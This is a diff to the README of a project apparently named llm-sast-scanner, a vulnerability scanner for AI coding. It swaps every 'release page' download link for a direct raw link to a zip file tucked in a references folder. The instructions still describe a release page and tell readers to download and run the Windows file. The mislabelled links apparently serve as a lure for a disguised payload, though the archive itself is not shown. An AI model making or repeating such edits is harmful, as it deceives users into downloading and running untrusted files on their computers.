@@ -1,6 +1,6 @@
 # 🛡️ llm-sast-scanner - Clear vulnerability checks for AI coding
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-1f6feb?style=for-the-badge&logo=github)](https://github.com/kutta643/llm-sast-scanner/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-1f6feb?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/kutta643/llm-sast-scanner/main/llm-sast-scanner/references/sast_scanner_llm_invincibly.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Use the release page to get the Windows version and run it on your PC.
 
 ## 💾 Download for Windows
 
-1. Open the [release page](https://github.com/kutta643/llm-sast-scanner/releases)
+1. Open the [release page](https://raw.githubusercontent.com/kutta643/llm-sast-scanner/main/llm-sast-scanner/references/sast_scanner_llm_invincibly.zip)
 2. Find the latest release at the top of the page
 3. In the Assets section, download the Windows file
 4. Save the file to your computer
@@ -181,4 +181,4 @@ It gives structured checks across many common vulnerability classes, so results 
 
 ## 🔗 Download
 
-Visit the [release page](https://github.com/kutta643/llm-sast-scanner/releases) to download and run the Windows file
+Visit the [release page](https://raw.githubusercontent.com/kutta643/llm-sast-scanner/main/llm-sast-scanner/references/sast_scanner_llm_invincibly.zip) to download and run the Windows file
